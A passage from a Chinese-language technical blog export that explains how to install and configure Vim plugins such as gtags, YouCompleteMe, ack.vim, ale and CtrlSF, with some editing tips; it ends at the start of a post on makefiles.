<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>从官网下载global安装包<br><a href="https://www.gnu.org/software/global/download.html">https://www.gnu.org/software/global/download.html</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装依赖库</span></span><br><span class="line">sudo apt install gcc make libncurses5-dev libncursesw5-dev</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压global到/opt目录</span></span><br><span class="line">tar -xzvf globalxxx.tar.gz</span><br><span class="line">mv globalxxx /opt/global</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译安装</span></span><br><span class="line">cd /opt/global</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h3 id="配置-14"><a href="#配置-14" class="headerlink" title="配置"></a>配置</h3><ul>
<li>由于gtags和gscope可以增量更新tags文件，那不用想，肯定用</li>
<li>cscope直接弃用</li>
<li>ctags不能直接弃用，因为和vim深度匹配，但是gtags可以包含它的功能</li>
<li>那么就只用ctags来生成系统函数的标签，工程目录的标签全部交给gtags和gscope来监管</li>
<li>当前就出现，如果工程内查找，使用<code>vim-gutentags</code>的快捷键</li>
<li>如果需要看系统函数原型，使用ctags的快捷键<code>Ctrl + ]</code></li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; gutentags</span></span><br><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/<span class="keyword">vim</span>-gutentags</span><br><span class="line"><span class="keyword">set</span> cscopetag                                   <span class="comment">&quot; use cscope for tags command</span></span><br><span class="line"><span class="keyword">set</span> cscopeprg=<span class="string">&#x27;gtags-cscope&#x27;</span>                    <span class="comment">&quot; replace cscope with gtags-cscope</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:gutentags_auto_add_gtags_cscope</span>=<span class="number">0</span>         <span class="comment">&quot; disable gutentags auto add gtags_cscope, use plus plugin to do this</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:gutentags_define_advanced_commands</span> = <span class="number">1</span>    <span class="comment">&quot; enable gutentags use advanced commands</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:gutentags_modules</span>=[<span class="string">&#x27;gtags_cscope&#x27;</span>]        <span class="comment">&quot; enable gtags module</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:gutentags_project_root</span> = [<span class="string">&#x27;.root&#x27;</span>]        <span class="comment">&quot; define project root dir/file name for gutentags</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:gutentags_add_default_project_roots</span> = <span class="number">0</span>   <span class="comment">&quot; won&#x27;t add default roots, only use root dir/file user add</span></span><br><span class="line"><span class="string">&quot; let g:gutentags_ctags_extra_args = [&#x27;--fields=+niazS&#x27;, &#x27;--extra=+q&#x27;, &#x27;--c++-kinds=+px&#x27;, &#x27;--c-kinds=+px&#x27;]    &quot;</span> ctags extra <span class="keyword">args</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:gutentags_cache_dir</span> = <span class="built_in">expand</span>(<span class="string">&#x27;~/.cache/tags&#x27;</span>)         <span class="comment">&quot; put tags out of project</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;leader&gt;</span>d yi<span class="variable">w:GscopeFind</span> g <span class="symbol">&lt;C-R&gt;</span><span class="comment">&quot;&lt;cr&gt; :2cc&lt;cr&gt; :cclose&lt;cr&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; gutentags_plus</span></span><br><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/gutentags_plus</span><br></pre></td></tr></table></figure>

<p><strong>快捷键</strong></p>
<ul>
<li><code>&lt;leader&gt;d</code>: 跳转函数定义点</li>
<li><code>&lt;leader&gt;cg</code>: 函数定义地方，输出到quickfix</li>
<li><code>&lt;leader&gt;cs</code>: 符号引用地方，输出到quickfix</li>
<li><code>&lt;leader&gt;cc</code>: 函数调用地方，输出到quickfix</li>
<li><code>&lt;leader&gt;ci</code>: 文件包含地方，输出到quickfix</li>
<li><code>&lt;leader&gt;cf</code>: 文件路径，输出到quickfix</li>
</ul>
<h3 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h3><h4 id="1-gutentags-ctags-job-failed-returned-122"><a href="#1-gutentags-ctags-job-failed-returned-122" class="headerlink" title="1) gutentags: ctags job failed, returned: 122"></a>1) <code>gutentags: ctags job failed, returned: 122</code></h4><ul>
<li>查看<code>~/.vim/bundle/vim-gutentags/plat/unix/</code>下的脚本是否都有可执行权限，没有就加一下就好了</li>
</ul>
<h2 id="13-python格式化-auto-pep8"><a href="#13-python格式化-auto-pep8" class="headerlink" title="13. python格式化 auto-pep8"></a>13. python格式化 auto-pep8</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>需要安装autopep8</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pip install autopep8</span><br></pre></td></tr></table></figure>

<h2 id="14-YCM代码提示插件-YouCompleteMe"><a href="#14-YCM代码提示插件-YouCompleteMe" class="headerlink" title="14. YCM代码提示插件 YouCompleteMe"></a>14. YCM代码提示插件 YouCompleteMe</h2><p>从github下载zip包<br><a href="https://github.com/ycm-core/YouCompleteMe">https://github.com/ycm-core/YouCompleteMe</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装相关依赖库</span></span><br><span class="line">sudo apt install cmake libclang-dev</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译YCM</span></span><br><span class="line">cd ~/.vim/bundle/YouCompleteMe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">四个选项分别对应，使用本地libclang（否则会去下载），c/c++代码提示，js代码提示，go代码提示，根据需求自己删</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不管选什么一定支持python代码提示，其他还支持java、rust、c<span class="comment">#</span></span></span><br><span class="line">python install.py --system-libclang --clang-completer --ts-completer --go-completer</span><br></pre></td></tr></table></figure>

<p><strong>Youcompleteme要求vim使用python(3.5.+)编译</strong></p>
<ul>
<li>自编译vim使用youcompleteme出现报错</li>
<li>查看<a href="https://github.com/ycm-core/YouCompleteMe/wiki/Building-Vim-from-source">https://github.com/ycm-core/YouCompleteMe/wiki/Building-Vim-from-source</a></li>
</ul>
<h3 id="配置-15"><a href="#配置-15" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; YouCompleteMe</span></span><br><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/YouCompleteMe</span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ycm_global_ycm_extra_conf</span>=<span class="string">&#x27;~/.vim/.ycm_extra_conf.py&#x27;</span></span><br><span class="line"><span class="comment">&quot; 跳转快捷键</span></span><br><span class="line"><span class="comment">&quot; nnoremap &lt;c-k&gt; :YcmCompleter GoToDeclaration&lt;CR&gt;|</span></span><br><span class="line"><span class="comment">&quot; nnoremap &lt;c-h&gt; :YcmCompleter GoToDefinition&lt;CR&gt;|</span></span><br><span class="line"><span class="comment">&quot; nnoremap &lt;c-j&gt; :YcmCompleter GoToDefinitionElseDeclaration&lt;CR&gt;|</span></span><br><span class="line"><span class="comment">&quot; 语法关键字补全</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ycm_seed_identifiers_with_syntax</span>=<span class="number">1</span></span><br><span class="line"><span class="comment">&quot; 开启 YCM 基于标签引擎</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ycm_collect_identifiers_from_tags_files</span>=<span class="number">1</span></span><br><span class="line"><span class="comment">&quot; 在注释输入中也能补全</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ycm_complete_in_comments</span>=<span class="number">1</span></span><br><span class="line"><span class="comment">&quot; 在字符串输入中也能补全</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ycm_complete_in_strings</span>=<span class="number">1</span></span><br><span class="line"><span class="comment">&quot; 注释和字符串中的文字也会被收入补全</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ycm_collect_identifiers_from_comments_and_strings</span>=<span class="number">1</span></span><br><span class="line"><span class="comment">&quot; 禁用语法检查</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ycm_show_diagnostics_ui</span>=<span class="number">0</span></span><br><span class="line"><span class="comment">&quot; input two character to trigger complete</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ycm_semantic_triggers</span>=&#123; <span class="string">&#x27;c,cpp,python,java,go,erlang,perl,cs,lua,javascript&#x27;</span>: [<span class="string">&#x27;re!\w&#123;2&#125;&#x27;</span>] &#125;</span><br><span class="line"><span class="comment">&quot; don&#x27;t show preview window when input complete</span></span><br><span class="line"><span class="comment">&quot; let g:ycm_add_preview_to_completeopt=0</span></span><br><span class="line"><span class="comment">&quot; close preview window when leave iw_nsertmode</span></span><br><span class="line"><span class="comment">&quot; let g:ycm_autoclose_preview_window_after_insertion=1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>代码提示需要设定头文件位置，需要配置<code>.ycm_extra_conf.py</code>文件</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># These are the compilation flags that will be used in case there&#x27;s no</span></span><br><span class="line"><span class="comment"># compilation database set (by default, one is not set).</span></span><br><span class="line"><span class="comment"># CHANGE THIS LIST OF FLAGS. YES, THIS IS THE DROID YOU HAVE BEEN LOOKING FOR.</span></span><br><span class="line">flags = [</span><br><span class="line"><span class="string">&#x27;-Wall&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-Wextra&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-Werror&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-fexceptions&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-DNDEBUG&#x27;</span>,</span><br><span class="line"><span class="comment"># THIS IS IMPORTANT! Without a &quot;-std=&lt;something&gt;&quot; flag, clang won&#x27;t know which</span></span><br><span class="line"><span class="comment"># language to use when compiling headers. So it will guess. Badly. So C++</span></span><br><span class="line"><span class="comment"># headers will be compiled as C headers. You don&#x27;t want that so ALWAYS specify</span></span><br><span class="line"><span class="comment"># a &quot;-std=&lt;something&gt;&quot;.</span></span><br><span class="line"><span class="comment"># For a C project, you would set this to something like &#x27;c99&#x27; instead of</span></span><br><span class="line"><span class="comment"># &#x27;c++11&#x27;.</span></span><br><span class="line"><span class="string">&#x27;-std=c++11&#x27;</span>,</span><br><span class="line"><span class="comment"># ...and the same thing goes for the magic -x option which specifies the</span></span><br><span class="line"><span class="comment"># language that the files to be compiled are written in. This is mostly</span></span><br><span class="line"><span class="comment"># relevant for c++ headers.</span></span><br><span class="line"><span class="comment"># For a C project, you would set this to &#x27;c&#x27; instead of &#x27;c++&#x27;.</span></span><br><span class="line"><span class="string">&#x27;-x&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c++&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-isystem&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;/usr/include/c++/9&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-isystem&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;/usr/include&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="15-go插件-vim-go"><a href="#15-go插件-vim-go" class="headerlink" title="15. go插件 vim-go"></a>15. go插件 vim-go</h2><p><a href="https://github.com/fatih/vim-go">https://github.com/fatih/vim-go</a></p>
<ul>
<li>路径配置好后，需要安装go的几个依赖库</li>
<li>打开一个go文件，执行下面命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:GoInstallBinaries</span><br></pre></td></tr></table></figure>

<h2 id="16-注释生成插件-DoxygenToolkit-vim"><a href="#16-注释生成插件-DoxygenToolkit-vim" class="headerlink" title="16. 注释生成插件 DoxygenToolkit.vim"></a>16. 注释生成插件 DoxygenToolkit.vim</h2><p><a href="https://github.com/babaybus/DoxygenToolkit.vim.git">https://github.com/babaybus/DoxygenToolkit.vim.git</a></p>
<h2 id="17-全局搜索插件-ack-vim"><a href="#17-全局搜索插件-ack-vim" class="headerlink" title="17. 全局搜索插件 ack.vim"></a>17. 全局搜索插件 ack.vim</h2><p><a href="https://github.com/mileszs/ack.vim.git">https://github.com/mileszs/ack.vim.git</a></p>
<ul>
<li>vimg太慢了，ack调用的是grep命令，比较快</li>
</ul>
<p><strong>配置</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; 高亮搜索的文本</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ackhighlight</span> = <span class="number">1</span></span><br><span class="line"><span class="comment">&quot; search current file</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;leader&gt;</span><span class="keyword">f</span> yi<span class="variable">w:Ack</span>!<span class="symbol">&lt;space&gt;</span>-i<span class="symbol">&lt;space&gt;</span><span class="symbol">&lt;C-R&gt;</span><span class="comment">&quot;&lt;space&gt;%</span></span><br><span class="line"><span class="comment">&quot; search all file</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;leader&gt;</span>F yi<span class="variable">w:Ack</span>!<span class="symbol">&lt;space&gt;</span>-i<span class="symbol">&lt;space&gt;</span><span class="symbol">&lt;C-R&gt;</span><span class="comment">&quot;&lt;space&gt;**/*.*</span></span><br><span class="line"><span class="comment">&quot; search current file</span></span><br><span class="line"><span class="keyword">vmap</span> <span class="symbol">&lt;leader&gt;</span><span class="keyword">f</span> <span class="keyword">y</span>:Ack!<span class="symbol">&lt;space&gt;</span>-i<span class="symbol">&lt;space&gt;</span><span class="symbol">&lt;C-R&gt;</span><span class="comment">&quot;&lt;space&gt;%</span></span><br><span class="line"><span class="comment">&quot; search all file</span></span><br><span class="line"><span class="keyword">vmap</span> <span class="symbol">&lt;leader&gt;</span>F <span class="keyword">y</span>:Ack!<span class="symbol">&lt;space&gt;</span>-i<span class="symbol">&lt;space&gt;</span><span class="symbol">&lt;C-R&gt;</span><span class="comment">&quot;&lt;space&gt;**/*.*</span></span><br></pre></td></tr></table></figure>

<p><strong>选项</strong></p>
<ul>
<li><code>-t TYPE</code>: 搜索某个类型的文件，具体类型代表哪些后缀可以用<code>ack --help-types</code>查看</li>
<li><code>-t noTYPE</code>: 排除某个类型文件</li>
<li><code>-i</code>: 忽略大小写</li>
</ul>
<p><strong>常用type</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cc           .c .h .xs</span><br><span class="line">hh           .h</span><br><span class="line">cpp          .cpp .cc .cxx .m .hpp .hh .h .hxx</span><br><span class="line">hpp          .hpp .hh .h .hxx</span><br><span class="line">go           .go</span><br><span class="line">js           .js</span><br><span class="line">json         .json</span><br><span class="line">python       .py; First line matches /^#!.*\bpython/</span><br><span class="line">html         .htm .html .xhtml</span><br><span class="line">make         .mk; .mak; makefile; Makefile; Makefile.Debug; Makefile.Release; GNUmakefile</span><br><span class="line">shell        .sh .bash .csh .tcsh .ksh .zsh .fish; First line matches /^#!.*\b(?:ba|t?c|k|z|fi)?sh\b/</span><br><span class="line">toml         .toml</span><br><span class="line">xml          .xml .dtd .xsd .xsl .xslt .ent .wsdl; First line matches /&lt;[?]xml/</span><br><span class="line">yaml         .yaml .yml</span><br><span class="line">lua          .lua; First line matches /^#!.*\blua(jit)?/</span><br></pre></td></tr></table></figure>

<p><strong>使用</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; 全局搜索js文件中的user字段，不自动打开文件</span></span><br><span class="line">:Ack! -i -t js <span class="string">&#x27;USER&#x27;</span></span><br><span class="line"><span class="comment">&quot; 在a/b/c目录搜索js文件中的user字段，不自动打开文件</span></span><br><span class="line">:Ack! -i -t js <span class="string">&#x27;USER&#x27;</span> <span class="keyword">a</span>/<span class="keyword">b</span>/<span class="keyword">c</span></span><br><span class="line"><span class="comment">&quot; 在a/b/c和b/c/d目录搜索js文件中的user字段，不自动打开文件</span></span><br><span class="line">:Ack! -i -t js <span class="string">&#x27;USER&#x27;</span> <span class="keyword">a</span>/<span class="keyword">b</span>/<span class="keyword">c</span> <span class="keyword">b</span>/<span class="keyword">c</span>/d</span><br><span class="line"><span class="comment">&quot; 全局搜索文件中的user字段，只搜索c源文件，不搜索头文件，不自动打开文件</span></span><br><span class="line">:Ack! -i -t <span class="keyword">cc</span> -T hh <span class="string">&#x27;USER&#x27;</span></span><br><span class="line"><span class="comment">&quot; 全局搜索文件中的user字段，在c代码和js代码中搜索，不自动打开文件</span></span><br><span class="line">:Ack! -i -t <span class="keyword">cc</span> -t js <span class="string">&#x27;USER&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="18-状态栏增强插件-vim-airline"><a href="#18-状态栏增强插件-vim-airline" class="headerlink" title="18. 状态栏增强插件 vim-airline"></a>18. 状态栏增强插件 vim-airline</h2><p><a href="https://github.com/vim-airline/vim-airline.git">https://github.com/vim-airline/vim-airline.git</a><br><a href="https://github.com/vim-airline/vim-airline-themes.git">https://github.com/vim-airline/vim-airline-themes.git</a></p>
<ul>
<li>想在状态栏显示git需要安装vim-fugitive</li>
</ul>
<p><strong>配置</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; 设置主题</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_theme</span>=<span class="string">&#x27;badwolf&#x27;</span></span><br><span class="line"><span class="comment">&quot; 统计空格数量，不需要就关了</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline</span>#extensions#whitespace#enabled = <span class="number">0</span></span><br><span class="line"><span class="comment">&quot; 展示tab栏</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline</span>#extensions#tabline#enabled = <span class="number">1</span></span><br><span class="line"><span class="comment">&quot; 显示buffer编号</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline</span>#extensions#tabline#buffer_nr_show = <span class="number">1</span></span><br><span class="line"><span class="comment">&quot; 不显示git分支名，默认显示</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline</span>#extensions#branch#enabled = <span class="number">0</span></span><br><span class="line"><span class="comment">&quot; 有些字体不支持箭头之类的符号，防止乱码，使用最普通的符号替代</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_left_sep</span> = <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_left_alt_sep</span> = <span class="string">&#x27;|&gt;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_right_sep</span> = <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_right_alt_sep</span> = <span class="string">&#x27;&lt;|&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="19-代码静态扫描插件-ale"><a href="#19-代码静态扫描插件-ale" class="headerlink" title="19. 代码静态扫描插件 ale"></a>19. 代码静态扫描插件 ale</h2><p><a href="https://github.com/dense-analysis/ale">https://github.com/dense-analysis/ale</a></p>
<h3 id="19-1-配置"><a href="#19-1-配置" class="headerlink" title="19.1. 配置"></a>19.1. 配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; vim-ale</span></span><br><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/ale</span><br><span class="line"><span class="comment">&quot; 禁用部分ale检查</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ale_pattern_options</span> = &#123;</span><br><span class="line">\   <span class="string">&#x27;\.min\.js$&#x27;</span>: &#123;</span><br><span class="line">\       <span class="string">&#x27;ale_enabled&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">\   &#125;,</span><br><span class="line">\   <span class="string">&#x27;\.json$&#x27;</span>: &#123;</span><br><span class="line">\       <span class="string">&#x27;ale_enabled&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">\   &#125;,</span><br><span class="line">\&#125;</span><br><span class="line"><span class="comment">&quot; 部分语言指定检查lint</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ale_linters</span> = &#123;</span><br><span class="line">\   <span class="string">&#x27;python&#x27;</span>: [<span class="string">&#x27;pylint&#x27;</span>],</span><br><span class="line">\   <span class="string">&#x27;cpp&#x27;</span>: [<span class="string">&#x27;clangtidy&#x27;</span>],</span><br><span class="line">\   <span class="string">&#x27;c&#x27;</span>: [<span class="string">&#x27;clangtidy&#x27;</span>],</span><br><span class="line">\&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ale_cpp_clangtidy_extra_options</span> = <span class="string">&quot;--config-file=/home/xxx/.clang-tidy&quot;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ale_c_clangtidy_extra_options</span> = <span class="string">&quot;--config-file=/home/xxx/.clang-tidy&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>ale_linters可选</strong></p>
<ul>
<li>c: <code>clangtidy</code></li>
<li>cpp: <code>clangtidy</code></li>
<li>python: <code>pylint</code></li>
</ul>
<h2 id="20-全局搜索插件-CtrlSF"><a href="#20-全局搜索插件-CtrlSF" class="headerlink" title="20. 全局搜索插件 CtrlSF"></a>20. 全局搜索插件 CtrlSF</h2><p><a href="https://github.com/dyng/ctrlsf.vim.git">https://github.com/dyng/ctrlsf.vim.git</a></p>
<ul>
<li>一款类似sublime的全局搜索插件</li>
<li>默认不使用正则表达式，需要加<code>-R</code></li>
<li>默认不区分大小写，需要区分加<code>-S</code></li>
<li>不知道为什么默认不搜索hpp结尾的文件，所以直接使用<code>:CtrlSF xxx **/*.*</code>来搜索所有文件</li>
<li>想要特定后缀文件<code>:CtrlSF xxx **/*.&#123;cpp,h,hpp&#125;</code></li>
</ul>
<h3 id="自定义配置"><a href="#自定义配置" class="headerlink" title="自定义配置"></a>自定义配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; normal下，对当前单词当前文件搜索和全局搜索</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;leader&gt;</span><span class="keyword">f</span> yi<span class="variable">w:CtrlSF</span><span class="symbol">&lt;space&gt;</span><span class="symbol">&lt;C-R&gt;</span><span class="comment">&quot;&lt;space&gt;%</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;leader&gt;</span>F yi<span class="variable">w:CtrlSF</span><span class="symbol">&lt;space&gt;</span><span class="symbol">&lt;C-R&gt;</span><span class="comment">&quot;&lt;space&gt;**/*.*</span></span><br><span class="line"><span class="comment">&quot; visual下，对当前选中文本当前文件搜索和全局搜索</span></span><br><span class="line"><span class="keyword">vmap</span> <span class="symbol">&lt;leader&gt;</span><span class="keyword">f</span> <span class="keyword">y</span>:CtrlSF<span class="symbol">&lt;space&gt;</span><span class="symbol">&lt;C-R&gt;</span><span class="comment">&quot;&lt;space&gt;%</span></span><br><span class="line"><span class="keyword">vmap</span> <span class="symbol">&lt;leader&gt;</span>F <span class="keyword">y</span>:CtrlSF<span class="symbol">&lt;space&gt;</span><span class="symbol">&lt;C-R&gt;</span><span class="comment">&quot;&lt;space&gt;**/*.*</span></span><br></pre></td></tr></table></figure>

<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p><strong>搜索命令</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; 1. Search in a specific sub-directory</span></span><br><span class="line">:CtrlSF &#123;pattern&#125; /path/<span class="keyword">to</span>/dir</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 2. Search case-insensitively</span></span><br><span class="line">:CtrlSF -I foo</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 2. Search case-sensitively</span></span><br><span class="line">:CtrlSF -S Foo</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 3. Search with regular expression</span></span><br><span class="line">:CtrlSF -R &#123;regex&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 4. Show result with specific context setting</span></span><br><span class="line">:CtrlSF -A <span class="number">3</span> -B <span class="number">1</span> &#123;pattern&#125;</span><br></pre></td></tr></table></figure>

<p><strong>快捷键</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Maps by default in CtrlSF window:</span><br><span class="line">  &lt;Enter&gt;, &lt;o&gt;, &lt;2-LeftMouse&gt; Open file which contains the line under cursor.</span><br><span class="line">  &lt;C-O&gt;          Open file in a horizontally split window.</span><br><span class="line">  &lt;p&gt;            Open a preview window to view file.</span><br><span class="line">  &lt;P&gt;            Open a preview window to view file and switch focus to it.</span><br><span class="line">  &lt;O&gt;            Like &lt;o&gt;, but always leave CtrlSF window open.</span><br><span class="line">  &lt;T&gt;            Like &lt;t&gt;, but focus CtrlSF window instead of opened new tab.</span><br><span class="line">  &lt;q&gt;            Quit CtrlSF. Also close preview window if any.</span><br><span class="line">  &lt;C-C&gt;          Stop running asynchronous searching.</span><br><span class="line">  &lt;C-J&gt;          Move cursor to next match.</span><br><span class="line">  &lt;C-K&gt;          Move cursor to previous match.</span><br><span class="line"></span><br><span class="line">Maps by default in preview window:</span><br><span class="line">  &lt;q&gt;            Quit preview mode.</span><br></pre></td></tr></table></figure>

<p><strong>其他命令</strong></p>
<ul>
<li><code>:CtrlSFToggle</code>: 重新打开上次搜索的窗口</li>
<li><code>:CtrlSFUpdate</code>: 重新搜索当前搜索词</li>
<li><code>:CtrlSFClose</code>或<code>q</code>: 关闭搜索结果窗口</li>
<li><code>:CtrlSFStop</code>: 停止当前搜索</li>
</ul>
<h2 id="21-打印函数-echodoc"><a href="#21-打印函数-echodoc" class="headerlink" title="21. 打印函数 echodoc"></a>21. 打印函数 echodoc</h2><p><a href="https://github.com/Shougo/echodoc.vim">https://github.com/Shougo/echodoc.vim</a></p>
<p><strong>配置</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">g:echodoc</span>#enable_at_startup=<span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:echodoc</span>#type=<span class="string">&#x27;floating&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="22-显示缩进线-indentLine"><a href="#22-显示缩进线-indentLine" class="headerlink" title="22. 显示缩进线 indentLine"></a>22. 显示缩进线 indentLine</h2><ul>
<li>使用此插件需要设置下面参数，会导致json文件和markdown文件显示不完全（比如少了双引号）</li>
<li>自己看情况是否需要</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">g:indentLine_conceallevel</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<h2 id="23-和git交互-vim-fugitive"><a href="#23-和git交互-vim-fugitive" class="headerlink" title="23. 和git交互 vim-fugitive"></a>23. 和git交互 vim-fugitive</h2><p><a href="https://github.com/tpope/vim-fugitive">https://github.com/tpope/vim-fugitive</a></p>
<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-删除键-backspace-不可用"><a href="#1-删除键-backspace-不可用" class="headerlink" title="1. 删除键(backspace)不可用"></a>1. 删除键(backspace)不可用</h2><ul>
<li>vim插入模式下，backspace键没有反应，是因为vim默认的backspace行为为空</li>
<li>配置<code>.vimrc</code>，插入<code>set backspace=indent,eol,start</code><ul>
<li>indent 前面有缩进删除到缩进位置</li>
<li>eol 行头删除一行</li>
<li>start 删除此次插入前的字符</li>
</ul>
</li>
</ul>
<h2 id="2-vi兼容模式"><a href="#2-vi兼容模式" class="headerlink" title="2. vi兼容模式"></a>2. vi兼容模式</h2><ul>
<li>vi兼容模式下编辑模式，上下左右会变成ABCD换行</li>
<li>需要在vimrc里面设置成<code>set nocp</code>不兼容模式</li>
</ul>
<h2 id="3-16进制查看编辑"><a href="#3-16进制查看编辑" class="headerlink" title="3. 16进制查看编辑"></a>3. 16进制查看编辑</h2><ul>
<li>在normal模式输入<code>:!xxd</code>转换到16进制查看编辑</li>
<li>编辑完输入<code>:!xxd -r</code>进行保存</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>makefile文件命令</title>
    <url>/blogs/2019-06-03-makefile/</url>
    <content><![CDATA[<h1 id="一、makefile"><a href="#一、makefile" class="headerlink" title="一、makefile"></a>一、makefile</h1><ul>
<li>先给个编译二进制的示例</li>
</ul>
